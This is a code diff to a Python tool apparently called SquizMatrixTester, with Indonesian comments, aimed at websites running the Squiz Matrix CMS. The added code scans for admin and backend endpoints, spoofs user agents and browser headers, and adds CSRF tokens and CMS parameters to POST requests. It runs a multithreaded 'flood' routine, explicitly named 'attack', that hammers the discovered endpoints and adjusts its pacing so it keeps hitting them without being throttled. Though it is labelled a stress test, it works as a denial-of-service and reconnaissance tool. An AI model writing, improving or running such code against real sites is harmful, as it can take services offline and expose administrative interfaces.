@@ -52,9 +52,69 @@ class SquizMatrixTester:
     def get_random_user_agent(self):
         return random.choice(self.user_agents)
 
+    def verify_endpoint(self, url, endpoint):
+        """Verifikasi ketersediaan endpoint sebelum melakukan test"""
+        full_url = f"{url.rstrip('/')}/{endpoint.lstrip('/')}"
+        try:
+            response = requests.head(
+                full_url,
+                headers={"User-Agent": self.get_random_user_agent()},
+                timeout=3,
+                verify=False,
+                allow_redirects=True
+            )
+            return 200 <= response.status_code < 404
+        except:
+            return False
+
+    def discover_valid_endpoints(self, url):
+        """Menemukan endpoint yang valid"""
+        print("[INFO] Discovering valid endpoints...")
+        valid_endpoints = []
+        
+        # Tambahkan endpoint discovery khusus Squiz Matrix
+        additional_endpoints = [
+            "_designs",
+            "_assets",
+            "_login",
+            "_web",
+            "_system",
+            "_recache",
+            "admin",
+            "_admin/backend.php",
+            "_admin/frontend.php",
+            "_administrative",
+            "_management"
+        ]
+        
+        self.endpoints.extend(additional_endpoints)
+        
+        for endpoint in self.endpoints:
+            if self.verify_endpoint(url, endpoint):
+                print(f"[SUCCESS] Found valid endpoint: {endpoint}")
+                valid_endpoints.append(endpoint)
+        
+        if not valid_endpoints:
+            print("[WARNING] No valid endpoints found. Using default endpoints.")
+            return self.endpoints
+        
+        return valid_endpoints
+
     def send_request(self, method, url, endpoint, data=None):
         full_url = f"{url.rstrip('/')}/{endpoint.lstrip('/')}"
         self.headers["User-Agent"] = self.get_random_user_agent()
+        
+        # Tambahkan header yang sering digunakan Squiz Matrix
+        additional_headers = {
+            "Cache-Control": "no-cache",
+            "Pragma": "no-cache",
+            "Sec-Fetch-Site": "same-origin",
+            "Sec-Fetch-Mode": "navigate",
+            "Sec-Fetch-User": "?1",
+            "Sec-Fetch-Dest": "document"
+        }
+        self.headers.update(additional_headers)
+        
         try:
             if method.upper() == "GET":
                 response = requests.get(
@@ -62,12 +122,18 @@ class SquizMatrixTester:
                     headers=self.headers, 
                     timeout=5, 
                     verify=False,
-                    allow_redirects=True  # Squiz sering menggunakan redirect
+                    allow_redirects=True
                 )
             else:
-                # Tambahkan CSRF token jika diperlukan
                 if data:
                     data["SQ_CSRF_TOKEN"] = self.get_csrf_token(url)
+                    # Tambahkan parameter yang sering digunakan Squiz Matrix
+                    data.update({
+                        "SQ_SYSTEM_NAME": "squiz_matrix",
+                        "SQ_ACTION_TYPE": "asset_action",
+                        "SQ_BACKEND_PAGE": "main"
+                    })
+                
                 response = requests.post(
                     full_url, 
                     json=data, 
@@ -76,6 +142,9 @@ class SquizMatrixTester:
                     verify=False,
                     allow_redirects=True
                 )
+            
+            if response.status_code in [404, 403]:
+                return None
             
             print(f"[{response.status_code}] {method} {full_url}")
             return response.text if response.ok else None
@@ -99,6 +168,14 @@ class SquizMatrixTester:
 
     def flood(self, url, workers=10, duration=60):
         print(f"[INFO] Starting stress test on {url} for {duration}s with {workers} threads")
+        
+        # Temukan endpoint yang valid terlebih dahulu
+        valid_endpoints = self.discover_valid_endpoints(url)
+        if not valid_endpoints:
+            print("[ERROR] No valid endpoints found. Aborting test.")
+            return
+            
+        self.endpoints = valid_endpoints
         start_time = time.time()
 
         def attack():
@@ -106,9 +183,11 @@ class SquizMatrixTester:
                 endpoint = random.choice(self.endpoints)
                 method = random.choice(["GET", "POST"])
                 payload = self.payloads.get("asset_test") if method == "POST" else None
-                self.send_request(method, url, endpoint, data=payload)
-                # Tambahkan delay kecil untuk menghindari rate limiting
-                time.sleep(random.uniform(0.1, 0.5))
+                result = self.send_request(method, url, endpoint, data=payload)
+                if result:
+                    time.sleep(random.uniform(0.1, 0.3))  # Kurangi delay jika request berhasil
+                else:
+                    time.sleep(random.uniform(0.5, 1.0))  # Tambah delay jika request gagal
 
         with ThreadPoolExecutor(max_workers=workers) as executor:
             futures = [executor.submit(attack) for _ in range(workers)]
